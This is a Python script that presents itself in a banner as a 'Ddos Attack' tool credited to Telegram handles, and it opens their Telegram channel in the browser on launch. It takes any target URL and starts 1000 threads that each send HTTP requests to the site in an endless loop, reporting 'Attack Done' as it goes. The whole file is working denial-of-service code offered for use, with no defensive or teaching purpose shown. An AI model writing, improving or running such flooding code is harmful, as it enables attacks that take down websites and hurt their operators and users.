import threading
import requests
import os
import time
import sys
import webbrowser
from fake_useragent import UserAgent


E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
B = "\033[1;30m"  # Black
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
Bl = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White
PN = "\033[1;35m"  # PINK

def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(23.0 / 8000)

to(
    f"""{G}|{C}=============================================={G}|
{G}| Creator     :  @toxic_tanji & @haxkx {G}         |
{G}| {Y}Tools      :  Ddos Attack       {G}   |
{G}| {PN}Expire     :  LIFETIME {G}          |
{G}| {W}Link       :  https://t.me/haxkx{G} |
{G}|{C}=============================================={G}|"""
)

webbrowser.open("https://t.me/haxkx")

def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Attack Done ✅ to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending attack to {url}: {e}")

def launch_attack(url, num_threads):
    for _ in range(num_threads):
        threading.Thread(target=send_request, args=(url,)).start()

if __name__ == "__main__":
    target_url = input("Baby Link dalo 🤤🌚=>: ")
    num_threads = 1000

    launch_attack(target_url, num_threads)
    